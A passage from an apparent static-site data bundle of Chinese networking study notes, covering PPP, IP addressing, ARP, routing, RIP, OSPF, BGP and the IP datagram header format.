Protocol)是现在全世界使用得最多的广域网数据链路层协议。\n * 用户使用拨号电话线接入因特网时，一般都是使用PPP 协议。 PPP协议就是计算机和ISP进行通信时所使用的数据链路层协议。\n\n\n# PPP协议的功能\n\n 1. 封装成帧\n 2. 透明传输\n 3. 差错检测\n 4. 支持多种网络层协议\n 5. 支持多种类型链路\n 6. 检测连接状态\n 7. 数据压缩协商\n 8. 网络层地址协商\n 9. 支持身份验证\n\n\n# 帧格式\n\n 1. 标志字段：标志帧的开始\n 2. 地址字段：因为是点对点所以不用设置地址，直接设置成FF\n 3. 控制字段：目前也没有给出意义\n 4. 协议：\n    1. 当协议字段为 0x0021 时， PPP 帧的信息字段就是IP 数据报。\n    2. 若为 0xC021, 则信息字段是 PPP 链路控制数据。\n    3. 若为 0x8021，则表示这是网络控制数据。\n 5. IP数据报：不超过1500字节，如果过长会进行分片，在网络层就已经解决了长度的问题\n 6. FCS：检验字段\n 7. 结束字段：标注帧的结束\n\n\n\n\n# 透明传输\n\n透明传输 因为标志字段的0x7E用二进制标志为01111110,即中间是6个0，为了避免产生错误，所以采用零比特填充的方式，即发送方每遇到5个1则填充一个0，接收方每遇到5个1删除后面的一个0\n\n\n\n\n# PPP协议的工作状态\n\n 1. 当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，建立一条物理连接。\n\n 2. PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧），以便建立数据链路连接。这些分组及其响应选择一些 PPP 参数。\n\n 3. 进行网络层配置， NCP 给新接入的 PC机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。\n\n 4. 通信完毕时， NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着， LCP 释放数据链路层连接。最后释放的是物理层的连接。\n    \n    \n    \n    > PPP包括 链路层控制协议与网络层控制协议\n    > \n    > LCP为链路控制协议用于链路层的建立，删除，监控等。可以建立点对点的链路层，监控链路状态，避免环路等功能并且提供PAP与CHAP的认证方式\n    > \n    > NCP为网络控制协议，常用IPCP，IPXCP。用于协商网络层的协议",normalizedContent:" * 点对点协议 ppp (point-to-point protocol)是现在全世界使用得最多的广域网数据链路层协议。\n * 用户使用拨号电话线接入因特网时，一般都是使用ppp 协议。 ppp协议就是计算机和isp进行通信时所使用的数据链路层协议。\n\n\n# ppp协议的功能\n\n 1. 封装成帧\n 2. 透明传输\n 3. 差错检测\n 4. 支持多种网络层协议\n 5. 支持多种类型链路\n 6. 检测连接状态\n 7. 数据压缩协商\n 8. 网络层地址协商\n 9. 支持身份验证\n\n\n# 帧格式\n\n 1. 标志字段：标志帧的开始\n 2. 地址字段：因为是点对点所以不用设置地址，直接设置成ff\n 3. 控制字段：目前也没有给出意义\n 4. 协议：\n    1. 当协议字段为 0x0021 时， ppp 帧的信息字段就是ip 数据报。\n    2. 若为 0xc021, 则信息字段是 ppp 链路控制数据。\n    3. 若为 0x8021，则表示这是网络控制数据。\n 5. ip数据报：不超过1500字节，如果过长会进行分片，在网络层就已经解决了长度的问题\n 6. fcs：检验字段\n 7. 结束字段：标注帧的结束\n\n\n\n\n# 透明传输\n\n透明传输 因为标志字段的0x7e用二进制标志为01111110,即中间是6个0，为了避免产生错误，所以采用零比特填充的方式，即发送方每遇到5个1则填充一个0，接收方每遇到5个1删除后面的一个0\n\n\n\n\n# ppp协议的工作状态\n\n 1. 当用户拨号接入 isp 时，路由器的调制解调器对拨号做出确认，建立一条物理连接。\n\n 2. pc 机向路由器发送一系列的 lcp 分组（封装成多个 ppp 帧），以便建立数据链路连接。这些分组及其响应选择一些 ppp 参数。\n\n 3. 进行网络层配置， ncp 给新接入的 pc机分配一个临时的 ip 地址，使 pc 机成为因特网上的一个主机。\n\n 4. 通信完毕时， ncp 释放网络层连接，收回原来分配出去的 ip 地址。接着， lcp 释放数据链路层连接。最后释放的是物理层的连接。\n    \n    \n    \n    > ppp包括 链路层控制协议与网络层控制协议\n    > \n    > lcp为链路控制协议用于链路层的建立，删除，监控等。可以建立点对点的链路层，监控链路状态，避免环路等功能并且提供pap与chap的认证方式\n    > \n    > ncp为网络控制协议，常用ipcp，ipxcp。用于协商网络层的协议",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"基本概念",frontmatter:{title:"基本概念",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/967962/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/00.%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"06.网络/02.网络原理/03.网络层/00.基本概念.md",key:"v-664a702a",path:"/pages/967962/",headers:[{level:3,title:"网络层提供的两种服务",slug:"网络层提供的两种服务",normalizedTitle:"网络层提供的两种服务",charIndex:2}],headersStr:"网络层提供的两种服务",content:"# 网络层提供的两种服务\n\n",normalizedContent:"# 网络层提供的两种服务\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"分类的IP地址",frontmatter:{title:"分类的IP地址",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/4ea062/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/01.%E5%88%86%E7%B1%BB%E7%9A%84IP%E5%9C%B0%E5%9D%80.html",relativePath:"06.网络/02.网络原理/03.网络层/01.分类的IP地址.md",key:"v-8ab9a634",path:"/pages/4ea062/",headersStr:null,content:"每一类地址都由两个固定长度的字段组成， 其中一个字段是网络号 net-id， 它标志主机（或路由器） 所连接到的网络， 而另一个字段则是主机号 host-id， 它标志该主机（或路由器） 。\n\n用转发器或网桥连接起来的若干个局域网仍为一个网络， 因此这些局域网都具有同样的网络号 net-id。\n\n\n\n\n# 点分十进制记法\n\n\n\n\n# 常用的三种类别的IP地址\n\n\n\nA：网络数减2原因： 网络号全0表示本网络 127(01111111)表示本地软件环回测试地址\n\nB、C：网络数减1原因：128.0.0.0和192.0.0.0都是不指派的\n\n主机数减2原因：全0和全1都不指派\n\n\n# 一般不使用的特殊的 IP 地址\n\n",normalizedContent:"每一类地址都由两个固定长度的字段组成， 其中一个字段是网络号 net-id， 它标志主机（或路由器） 所连接到的网络， 而另一个字段则是主机号 host-id， 它标志该主机（或路由器） 。\n\n用转发器或网桥连接起来的若干个局域网仍为一个网络， 因此这些局域网都具有同样的网络号 net-id。\n\n\n\n\n# 点分十进制记法\n\n\n\n\n# 常用的三种类别的ip地址\n\n\n\na：网络数减2原因： 网络号全0表示本网络 127(01111111)表示本地软件环回测试地址\n\nb、c：网络数减1原因：128.0.0.0和192.0.0.0都是不指派的\n\n主机数减2原因：全0和全1都不指派\n\n\n# 一般不使用的特殊的 ip 地址\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"地址解析协议ARP",frontmatter:{title:"地址解析协议ARP",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/421246/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/02.%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP.html",relativePath:"06.网络/02.网络原理/03.网络层/02.地址解析协议ARP.md",key:"v-c1d0fabe",path:"/pages/421246/",headersStr:null,content:"作用： 从网络层使用的 IP 地址，解析出在数据链路层使用的硬件地址。\n\n每一个主机都设有一个 ARP 高速缓存 ，保存着所在的局域网上的各主机和路由器的 IP 地址到硬件地 址的映射表。ARP把保存在高速缓存中的每一个映射地址项目都设置生存时间，凡超过生存时间的项目就从高速缓存中删除掉。\n\nARP的工作过程\n\n当主机A欲向本局域网上的某个主机B发送 IP数据报时，就先在其ARP高速缓存中查看有无主机B的IP 地址。\n\n * 如有，就可查出其对应的硬件地址，再将此硬件地址写入MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。\n\n * 如没有， ARP 进程在本局域网上广播发送一个 ARP 请求分组。 收到 ARP 响应分组后， 将得到的 IP 地址到硬件地址的映射写入 ARP 高速缓存\n\n * \n\n>  * ARP是解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题。\n>  * 从IP地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的。\n>  * 只要主机或路由器要和本网络上的另一个已知 IP 地址的主机或路由器进行通信， ARP 协议就会自动地将该 IP 地址解析为链路层所需要的硬件地址。\n\n如果是不同网络之间的情况，就需要通过路由器来解决\n\n例如：H1访问H3\n\n 1. 因为H3不在该网络上，先在本网络通过ARP，找到路由器R1，剩下的由R1完成\n\n\n\n 2. R1在网2再次通过ARP找到H3\n\n",normalizedContent:"作用： 从网络层使用的 ip 地址，解析出在数据链路层使用的硬件地址。\n\n每一个主机都设有一个 arp 高速缓存 ，保存着所在的局域网上的各主机和路由器的 ip 地址到硬件地 址的映射表。arp把保存在高速缓存中的每一个映射地址项目都设置生存时间，凡超过生存时间的项目就从高速缓存中删除掉。\n\narp的工作过程\n\n当主机a欲向本局域网上的某个主机b发送 ip数据报时，就先在其arp高速缓存中查看有无主机b的ip 地址。\n\n * 如有，就可查出其对应的硬件地址，再将此硬件地址写入mac 帧，然后通过局域网将该 mac 帧发往此硬件地址。\n\n * 如没有， arp 进程在本局域网上广播发送一个 arp 请求分组。 收到 arp 响应分组后， 将得到的 ip 地址到硬件地址的映射写入 arp 高速缓存\n\n * \n\n>  * arp是解决同一个局域网上的主机或路由器的 ip 地址和硬件地址的映射问题。\n>  * 从ip地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的。\n>  * 只要主机或路由器要和本网络上的另一个已知 ip 地址的主机或路由器进行通信， arp 协议就会自动地将该 ip 地址解析为链路层所需要的硬件地址。\n\n如果是不同网络之间的情况，就需要通过路由器来解决\n\n例如：h1访问h3\n\n 1. 因为h3不在该网络上，先在本网络通过arp，找到路由器r1，剩下的由r1完成\n\n\n\n 2. r1在网2再次通过arp找到h3\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"转发的流程",frontmatter:{title:"转发的流程",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/da6b66/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/03.%E8%BD%AC%E5%8F%91%E7%9A%84%E6%B5%81%E7%A8%8B.html",relativePath:"06.网络/02.网络原理/03.网络层/03.转发的流程.md",key:"v-1a476386",path:"/pages/da6b66/",headersStr:null,content:"# 路由表\n\n路由表需要配置，或者根据算法生成 路由选择协议\n\n\n\n下一跳指的是下一个路由器的地址\n\n\n# 特定路由和默认路由\n\n特定主机路由 ：为特定的目的主机指明一个路由。\n\n默认路由：没有特定设置则采用默认路由\n\n\n\n\n# 路由器分组转发算法\n\n 1. 通过目标主机的IP地址，确定目标网络N\n\n 2. 判断网络N是否与路由器直接相连\n    \n    1. 相连\n       \n       直接交付到目标主机\n    \n    2. 不相连\n       \n       1. 配置了特定主机路由，交付到下一跳\n       2. 没有特定主机路由，有到达网络的路由，交付到下一跳\n       3. 没有到达网络的路由，采用默认路由，交付到下一跳\n       4. 没有默认路由，报告转发失败",normalizedContent:"# 路由表\n\n路由表需要配置，或者根据算法生成 路由选择协议\n\n\n\n下一跳指的是下一个路由器的地址\n\n\n# 特定路由和默认路由\n\n特定主机路由 ：为特定的目的主机指明一个路由。\n\n默认路由：没有特定设置则采用默认路由\n\n\n\n\n# 路由器分组转发算法\n\n 1. 通过目标主机的ip地址，确定目标网络n\n\n 2. 判断网络n是否与路由器直接相连\n    \n    1. 相连\n       \n       直接交付到目标主机\n    \n    2. 不相连\n       \n       1. 配置了特定主机路由，交付到下一跳\n       2. 没有特定主机路由，有到达网络的路由，交付到下一跳\n       3. 没有到达网络的路由，采用默认路由，交付到下一跳\n       4. 没有默认路由，报告转发失败",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"路由选择协议",frontmatter:{title:"路由选择协议",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/d86cb6/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/04.%E8%B7%AF%E7%94%B1%E9%80%89%E6%8B%A9%E5%8D%8F%E8%AE%AE.html",relativePath:"06.网络/02.网络原理/03.网络层/04.路由选择协议.md",key:"v-77c1df3e",path:"/pages/d86cb6/",headersStr:null,content:"# 内部网关协议\n\n 1. RIP RIP\n 2. OSPF OSPF\n\n\n# 外部网关协议\n\n 1. BGP协议 BGP Question： 为什么不同自治系统之间不能使用内部网关协议？\n\nAnswer: 互联网的规模太大，使得自治系统之间路由选择非常困难。\n\n 1. 不同的自治系统对代价的定义是不一样的 自治系统之间的路由选择必须考虑有关策略。\n 2. 设计到国家安全等问题",normalizedContent:"# 内部网关协议\n\n 1. rip rip\n 2. ospf ospf\n\n\n# 外部网关协议\n\n 1. bgp协议 bgp question： 为什么不同自治系统之间不能使用内部网关协议？\n\nanswer: 互联网的规模太大，使得自治系统之间路由选择非常困难。\n\n 1. 不同的自治系统对代价的定义是不一样的 自治系统之间的路由选择必须考虑有关策略。\n 2. 设计到国家安全等问题",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"RIP",frontmatter:{title:"RIP",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/81e75c/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/05.RIP.html",relativePath:"06.网络/02.网络原理/03.网络层/05.RIP.md",key:"v-0c2cf986",path:"/pages/81e75c/",headersStr:null,content:" * RIP 是一种分布式的、基于距离向量的路由选择协议。\n\n * RIP 协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录。 RIP 协议中距离的定义\n\n\n# 工作要点\n\n * 仅和相邻路由器交换信息。\n * 交换的信息是当前本路由器所知道的全部信息， 即自己的路由表。\n * 按固定的时间间隔交换路由信息， 例如， 每隔 30 秒。\n * 路由器在刚刚开始工作时， 只知道到直接连接的网络的距离（此距离定义为1） 。\n * 以后， 每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。\n * 经过若干次更新后， 所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。\n * RIP 协议的收敛过程较快， 即在自治系统中所有的结点都得到正确的路由选择信息的过程\n\n\n# 更新路由的过程\n\n距离向量算法\n\n\n\n收到相邻路由器（其地址为 X）的一个 RIP 报文：\n\n 1. 先修改此 RIP 报文中的所有项目：把“下一跳”字段中的地址都改为 X，并把所有的“距离”字段的值加 1。\n\n 2. 对修改后的 RIP 报文中的每一个项目，重复以下步骤：\n    \n    1. 若项目中的目的网络不在路由表中，则把该项目加到路由表中。\n    \n    2. 否则\n       \n       1. 若下一跳字段给出的路由器地址是同样的，则把收到的项目替换原路由表中的项目。\n\n 3. 否则\n    \n    1. 若收到项目中的距离小于路由表中的距离，则进行更新。 2. 否则，什么也不做。\n\n 4. 若 3 分钟还没有收到相邻路由器的更新路由表，则把此相邻路由器记为不可达路由器，即将距离置为16（距离为16表示不可达）\n\n 5. 返回\n\n> 例子：R~6~收到R~4~发来的路由表\n> \n> 最先开始的R~4~\n> \n> \n> \n> 距离加1，下一跳改成R~4~\n> \n> \n> \n> 与R~6~原有的对比\n> \n> \n> \n> 更新之后，最后结果\n\n\n# RIP协议的优缺点\n\n优点：实现简单， 开销较小。\n\n缺点：\n\n 1. RIP 限制了网络的规模。\n    \n    > 因为距离最大为15，超过16就认为不可达\n\n 2. 当网络出现故障时， 要经过比较长的时间才能将此信息传送到所有的路由器。\n    \n    > 好消息传得快，坏消息传的慢\n\n 3. 路由器之间交换的路由信息是路由器中的完整路由表， 因而随着网络规模的扩大， 开销也就增加。\n    \n    > 记录了大量的路由信息",normalizedContent:" * rip 是一种分布式的、基于距离向量的路由选择协议。\n\n * rip 协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录。 rip 协议中距离的定义\n\n\n# 工作要点\n\n * 仅和相邻路由器交换信息。\n * 交换的信息是当前本路由器所知道的全部信息， 即自己的路由表。\n * 按固定的时间间隔交换路由信息， 例如， 每隔 30 秒。\n * 路由器在刚刚开始工作时， 只知道到直接连接的网络的距离（此距离定义为1） 。\n * 以后， 每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。\n * 经过若干次更新后， 所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。\n * rip 协议的收敛过程较快， 即在自治系统中所有的结点都得到正确的路由选择信息的过程\n\n\n# 更新路由的过程\n\n距离向量算法\n\n\n\n收到相邻路由器（其地址为 x）的一个 rip 报文：\n\n 1. 先修改此 rip 报文中的所有项目：把“下一跳”字段中的地址都改为 x，并把所有的“距离”字段的值加 1。\n\n 2. 对修改后的 rip 报文中的每一个项目，重复以下步骤：\n    \n    1. 若项目中的目的网络不在路由表中，则把该项目加到路由表中。\n    \n    2. 否则\n       \n       1. 若下一跳字段给出的路由器地址是同样的，则把收到的项目替换原路由表中的项目。\n\n 3. 否则\n    \n    1. 若收到项目中的距离小于路由表中的距离，则进行更新。 2. 否则，什么也不做。\n\n 4. 若 3 分钟还没有收到相邻路由器的更新路由表，则把此相邻路由器记为不可达路由器，即将距离置为16（距离为16表示不可达）\n\n 5. 返回\n\n> 例子：r~6~收到r~4~发来的路由表\n> \n> 最先开始的r~4~\n> \n> \n> \n> 距离加1，下一跳改成r~4~\n> \n> \n> \n> 与r~6~原有的对比\n> \n> \n> \n> 更新之后，最后结果\n\n\n# rip协议的优缺点\n\n优点：实现简单， 开销较小。\n\n缺点：\n\n 1. rip 限制了网络的规模。\n    \n    > 因为距离最大为15，超过16就认为不可达\n\n 2. 当网络出现故障时， 要经过比较长的时间才能将此信息传送到所有的路由器。\n    \n    > 好消息传得快，坏消息传的慢\n\n 3. 路由器之间交换的路由信息是路由器中的完整路由表， 因而随着网络规模的扩大， 开销也就增加。\n    \n    > 记录了大量的路由信息",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"RIP 协议中距离的定义",frontmatter:{title:"RIP 协议中距离的定义",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/cc9ecc/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/06.RIP%20%E5%8D%8F%E8%AE%AE%E4%B8%AD%E8%B7%9D%E7%A6%BB%E7%9A%84%E5%AE%9A%E4%B9%89.html",relativePath:"06.网络/02.网络原理/03.网络层/06.RIP 协议中距离的定义.md",key:"v-209aa9f8",path:"/pages/cc9ecc/",headersStr:null,content:"距离的定义：\n\n * 从一路由器到直接连接的网络的距离定义为 1。\n * 从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加 1。\n * RIP 认为一个好的路由就是它通过的路由器的数目少，即“距离短”\n * RIP 允许一条路径最多只能包含 15 个路由器。\n * “距离”的最大值为16 时即相当于不可达。",normalizedContent:"距离的定义：\n\n * 从一路由器到直接连接的网络的距离定义为 1。\n * 从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加 1。\n * rip 认为一个好的路由就是它通过的路由器的数目少，即“距离短”\n * rip 允许一条路径最多只能包含 15 个路由器。\n * “距离”的最大值为16 时即相当于不可达。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"OSPF",frontmatter:{title:"OSPF",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/9693e5/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/07.OSPF.html",relativePath:"06.网络/02.网络原理/03.网络层/07.OSPF.md",key:"v-1ee5aeba",path:"/pages/9693e5/",headersStr:null,content:"OSPF是分布式的链路状态协议。\n\n * 使用洪泛法向本自治系统中所有路由器发送信息。\n\n * 发送的信息就是与本路由器相邻的所有路由器的链路状态。\n   \n   > “链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量” (metric)。\n\n * 只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。\n\n * 由于各路由器之间频繁地交换链路状态信息，因此所有的路由器最终都能建立一个链路状态数据库。\n\n * 链路状态数据库实际上就是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步）。\n\n * 每一个路由器使用链路状态数据库中的数据,构造出自己的路由表。\n   \n   > 采用迪杰斯特拉最短路径算法来计算出\n\n\n# OSPF的区域\n\n * 为了使 OSPF 能够用于规模很大的网络， OSPF 将一个自治系统再划分为若干个更小的范围，叫作区域。\n * 划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量。\n\n\n\n\n# OSPF的分组类型\n\n 1. 问候(Hello)分组。用来发现和维持邻站的可达性。\n 2. 数据库描述(Database Description)分组。向邻站给出自己的链路状态数据库的摘要信息。\n 3. 链路状态请求(Link State Request)分组。向对方请求发送某些链路状态项目的详细信息。\n 4. 链路状态更新(Link State Update)分组，用洪泛法对全网更新链路状态。\n 5. 链路状态确认(Link State Acknowledgment)分组，对链路更新分组的确认。\n\n\n\n更新时洪泛的效果图\n\n",normalizedContent:"ospf是分布式的链路状态协议。\n\n * 使用洪泛法向本自治系统中所有路由器发送信息。\n\n * 发送的信息就是与本路由器相邻的所有路由器的链路状态。\n   \n   > “链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量” (metric)。\n\n * 只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。\n\n * 由于各路由器之间频繁地交换链路状态信息，因此所有的路由器最终都能建立一个链路状态数据库。\n\n * 链路状态数据库实际上就是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步）。\n\n * 每一个路由器使用链路状态数据库中的数据,构造出自己的路由表。\n   \n   > 采用迪杰斯特拉最短路径算法来计算出\n\n\n# ospf的区域\n\n * 为了使 ospf 能够用于规模很大的网络， ospf 将一个自治系统再划分为若干个更小的范围，叫作区域。\n * 划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量。\n\n\n\n\n# ospf的分组类型\n\n 1. 问候(hello)分组。用来发现和维持邻站的可达性。\n 2. 数据库描述(database description)分组。向邻站给出自己的链路状态数据库的摘要信息。\n 3. 链路状态请求(link state request)分组。向对方请求发送某些链路状态项目的详细信息。\n 4. 链路状态更新(link state update)分组，用洪泛法对全网更新链路状态。\n 5. 链路状态确认(link state acknowledgment)分组，对链路更新分组的确认。\n\n\n\n更新时洪泛的效果图\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"BGP",frontmatter:{title:"BGP",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/681242/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/08.BGP.html",relativePath:"06.网络/02.网络原理/03.网络层/08.BGP.md",key:"v-a7b5a1b4",path:"/pages/681242/",headersStr:null,content:"# 工作原理\n\n * BGP力求寻找一条能够到达目的网络且比较好的路由（不能兜圈子），而并非要寻找一条最佳路由。\n\n * BGP采用路径向量路由选择协议。\n\n * 每一个自治系统的管理员要选择至少一个路由器作为该自治系统的“ BGP 发言人”。\n   \n   > 一般选择边界路由器\n\n * BGP发言人与其他自治系统的BGP发言人交换路由信息。\n\n * BGP 所交换的网络可达性的信息就是要到达某个网络所要经过的一系列 AS。\n\n * 当 BGP 发言人互相交换了网络可达性的信息后，各 BGP发言人就根据所采用的策略从收到的路由信息中找出到达各 AS 的较好路由。\n   \n   > \n\n\n# 特点\n\n * BGP 协议交换路由信息的结点数量级是自治系统数的量级。\n * 要在许多自治系统之间寻找一条较好的路径，就要寻找正确的BGP发言人。\n * BGP 支持 CIDR，因此 BGP 的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的各个自治系统序列。\n * 在 BGP 刚刚运行时， BGP 的邻站是交换整个的 BGP 路由表。但以后只需要在发生变化时更新有变化的部分\n\n\n# 四种报文\n\n 1. 打开 (OPEN) 报文，用来与相邻的另一个BGP发言人建立关系。\n 2. 更新 (UPDATE) 报文，用来发送某一路由的信息，以及列出要撤消的多条路由。\n 3. 保活 (KEEPALIVE) 报文，用来确认打开报文和周期性地证实邻站关系。\n 4. 通知 (NOTIFICATION) 报文，用来发送检测到的差错。",normalizedContent:"# 工作原理\n\n * bgp力求寻找一条能够到达目的网络且比较好的路由（不能兜圈子），而并非要寻找一条最佳路由。\n\n * bgp采用路径向量路由选择协议。\n\n * 每一个自治系统的管理员要选择至少一个路由器作为该自治系统的“ bgp 发言人”。\n   \n   > 一般选择边界路由器\n\n * bgp发言人与其他自治系统的bgp发言人交换路由信息。\n\n * bgp 所交换的网络可达性的信息就是要到达某个网络所要经过的一系列 as。\n\n * 当 bgp 发言人互相交换了网络可达性的信息后，各 bgp发言人就根据所采用的策略从收到的路由信息中找出到达各 as 的较好路由。\n   \n   > \n\n\n# 特点\n\n * bgp 协议交换路由信息的结点数量级是自治系统数的量级。\n * 要在许多自治系统之间寻找一条较好的路径，就要寻找正确的bgp发言人。\n * bgp 支持 cidr，因此 bgp 的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的各个自治系统序列。\n * 在 bgp 刚刚运行时， bgp 的邻站是交换整个的 bgp 路由表。但以后只需要在发生变化时更新有变化的部分\n\n\n# 四种报文\n\n 1. 打开 (open) 报文，用来与相邻的另一个bgp发言人建立关系。\n 2. 更新 (update) 报文，用来发送某一路由的信息，以及列出要撤消的多条路由。\n 3. 保活 (keepalive) 报文，用来确认打开报文和周期性地证实邻站关系。\n 4. 通知 (notification) 报文，用来发送检测到的差错。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"IP数据报格式",frontmatter:{title:"IP数据报格式",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/f9e6b1/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/09.IP%E6%95%B0%E6%8D%AE%E6%8A%A5%E6%A0%BC%E5%BC%8F.html",relativePath:"06.网络/02.网络原理/03.网络层/09.IP数据报格式.md",key:"v-667a416a",path:"/pages/f9e6b1/",headersStr:null,content:"一个 IP 数据报由首部和数据两部分组成。\n\n\n\n首部分为固定部分和可变部分，固定部分长度为20个字节，可变部分长度是可变的。\n\n\n\n\n# 固定部分\n\n版本ip协议版本：ipv4和ipv6\n\n * 首部长度：占 4 位，可表示的最大数值是 15 （ $2^4 - 1$）个单位(一个单位为 4 字节)。因此 IP 的首部长度的最大值是 60 字节(15*4)。\n\n * 区分服务：占 8 位，只有在使用区分服务（DiffServ）时，这个字段才起作用。在一般的情况下都不使用这个字段。\n\n * 总长度：占 16 位，这个字段的内容表示首部和数据之和的长度，单位为字节，因此数据报的最大长度为 65535 字节。\n\n进行数据报的分片的原因\n\n 1. IP数据报的总长度必须不超过数据链路层最大传送单元 MTU。\n 2. 若所传送的数据报的长度超过数据链路层的MTU值， 就必须把过长的数据报进行分片处理。\n\n标识：占 16 位，它是一个计数器，用来产生 IP 数据报的标识。\n\n> 有同样标识的ip数据报属于同一个未分片的ip数据报\n\n标志(flag)：占 3 位，目前只有前两位有意义。\n\n> 标志字段的最低位是 MF (More Fragment)。MF = 1 表示后面“还有分片”。 MF = 0 表示最后一个分片。\n> \n> 标志字段中间的一位是 DF (Don‘t Fragment) 。 DF = 1 表示不允许分片。 MF = 0 表示允许分片。\n\n片偏移：占13 位，指出：较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。\n\n\n\n\n\n生存时间——占8 位，记为 TTL (Time To 